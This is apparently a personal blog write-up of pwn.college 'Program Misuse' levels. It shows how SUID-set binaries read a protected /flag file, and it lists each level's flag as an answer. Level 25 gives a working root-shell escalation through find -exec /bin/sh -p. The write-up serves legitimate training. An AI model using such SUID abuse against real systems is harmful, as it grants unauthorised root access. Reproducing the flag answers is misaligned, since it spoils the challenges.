---
layout: post
title: Essential linux command _ Program Misuse/pwn college
subtitle: How to Read Sensitive Files with SUID set on the Commands and How to Escalate Privilege
# cover-img: /assets/img/banditlogo.png
# thumbnail-img: /assets/img/overthewire.jpeg
# share-img: /assets/img/path.jpg
tags: [CLI, security, linux, pwn, college]
comments: true
author: Lantana Park
---


Introduction of pwn.college

pwn.college is an online platform to learn about core concept of cyber security.

How to get started

I connected pwn workspace throgh SSH. 

1. Get the SSH key 
`ssh-keygen -f key -N''`

2. Input the SSH key in the setting

3. Connect its ssh server
`ssh -i key hacker@dojo.pwn.college`

Program Misuse: Privilege Escalation

- There are two directory we need to go through
one is /challenge(to check a quest) and the other is /flag(to get a flag)

Level 1 - the SUID bit on /usr/bin/cat.

Answer: pwn.college{gjH7qtwyI85Casi0wlbiFF21WWV.01M0EDL0MjM3QzW}

`cat` command allows users to view(read), concatenate, create, copy, merge, and manipulate file contents.

```bash
`cat /flag`
```

Level 2 - the SUID bit on /usr/bin/more

Answer: pwn.college{QHV-ipnvyIz8Nc8hGg_3SYOSlTF.0FN0EDL0MjM3QzW}

`more` command allows users to view the text files in the command prompt and do scroll up and down through the page. 

```bash
`more /flag`
``` 

Level 3 - the SUID bit on /usr/bin/less

Answer: pwn.college{QHV-ipnvyIz8Nc8hGg_3SYOSlTF.0FN0EDL0MjM3QzW}

`less` command allows users to read the contents of a text file one page (one screen) at a time. It is faster access because if a file is large.

```bash
`less /flag`
```

Level 4 - the SUID bit on /usr/bin/tail

Answer: pwn.college{w18iyy6r_Q4PqyYwepwYYLMVjcA.0lN0EDL0MjM3QzW}

`tail` command allows users to view the last few lines of a file. It can be also used to monitor the file changes in real time. 

```bash
`tail /flag`
```

Level 5 - the SUID bit on /usr/bin/head

Answer: pwn.college{kPSTIF4gcgWqfG-LxDqDEc_Y1mK.01N0EDL0MjM3QzW}

`head` command allows users to modify and output and display the wanted amount of data. By default, it shows the first 10 lines. 

```bash
`head /flag`
```

Level 6 - the SUID bit on /usr/bin/sort

Answer: pwn.college{sR_JFVkHOraSTyrEERthPJHkFmq.0FO0EDL0MjM3QzW}

`sort` command sorts the contents of a text file, line by line. 

```bash
`sort /flag`
```

Level 7 - the SUID bit on /usr/bin/vim

Answer: pwn.college{kmOZJ-C1zDmicWdPZmQxfdA48mN.0VO0EDL0MjM3QzW}

`vim` is a editor to create or edit a text file. There are two modes in vim. One is the command mode and another is the insert mode. In the command mode, users can insert text. 

```bash
`vim /flag`
```

Level 8 - the SUID bit on /usr/bin/emacs

Answer: pwn.college{s82YaBXGj7hiejfuk4gTOSiWRcS.0FM1EDL0MjM3QzW}

`emacs` is another file editor, like vim. The main difference between text editors like vi, vim, nano, and the Emacs is that is faster, powerful, and simple in terms of usage because of its simple user interface.

```bash
`emacs /flag`
```

Level 9 - the SUID bit on /usr/bin/nano

Answer: pwn.college{sJryTe-t1d5EN-wehnqIEnBp2a6.0VM1EDL0MjM3QzW}

`nano` is user-friendly command line-based text editor. Unlike vim editor or any other command-line editor, it doesn’t have any mode. And it has an easy GUI(Graphical User Interface) which allows users to interact directly with the text in spite of switching between the modes as in vim editor.

```bash
`nano /flag`
```

Level 10 - the SUID bit on /usr/bin/rev

Answer: pwn.college{AUiUyAs5rn99guDsmcLextnwB0i.0lM1EDL0MjM3QzW}

`rev` is to reverse the lines characterwise. It reverses the order of the characters in each lines by copying the specified files to the standard output.

```bash 
`rev /flag` 
`echo "}WzQ3MjM0LDE1Ml0.i0BwntxeLcmsDug99nr5sAyUiUA{egelloc.nwp" | rev`
```

Level 25 - the SUID bit on /usr/bin/find

Answer: pwn.college{0SWf5DIvyjnM2_ysyw26tcEJuyd.01N2EDL0MjM3QzW}

`find` is to search files and directories. To use the `find` command, I need to specify the directory to search and the criteria for the search.

```bash
find . -exec /bin/sh -p \;
# It will show a new shell
cat /flag
```









